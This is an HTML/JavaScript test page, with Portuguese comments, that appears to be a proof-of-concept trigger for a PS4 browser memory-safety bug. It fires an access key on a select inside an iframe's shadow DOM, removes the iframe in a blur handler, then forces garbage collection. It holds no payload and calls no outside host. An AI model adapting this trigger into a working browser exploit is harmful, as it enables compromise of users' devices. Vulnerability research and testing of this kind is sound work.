<html>
<head>
<script>
function forceGC() {
  for (let i = 0; i < 20; ++i) {
    new ArrayBuffer(100 * 1024 * 1024);
  }
}

async function magic() {
  frame.remove();
  document.body.innerHTML = '<p>Se você está vendo este texto, o select e o iframe foram removidos sem crash.</p>';
  forceGC();
}

function test() {
  var select = outerContainer.querySelector('select');
  var input  = outerContainer.querySelector('input');  // ? sem depender de índice

  if (!input) {
    document.body.innerHTML = '<p>ERRO: input não encontrado no shadow DOM.</p>';
    return;
  }

  input.addEventListener('blur', magic);
  input.focus();

  // Tenta acionar via access key sintético (pode ou não funcionar no PS4)
  document.dispatchEvent(new KeyboardEvent('keydown', {
    bubbles: true,
    cancelable: true,
    view: window,
    key: 'a',
    code: 'KeyA',
    altKey: true,
    keyIdentifier: 'U+0041'
  }));

  // Fallback: foca direto no select para acionar o blur?magic
  if (document.activeElement !== select) {
    select.focus();
  }
}
</script>
</head>
<body onload="test()">
<p>Teste: access key / select destroy no PS4</p>
<script>
  frame = document.body.appendChild(document.createElement('iframe'));
  frame.style = 'width: 100%; height: 100%; border: 0';
  outerContainer = frame.contentDocument.body.attachShadow({ mode: 'open' });
  outerContainer.innerHTML = `<select accesskey="a"><option>SouthSea</option></select>
<p>Made in the body</p>
<input>`;
  outerContainer.querySelector('input').addEventListener('blur', magic);
  outerContainer.querySelector('input').focus();
</script>
</body>
</html>
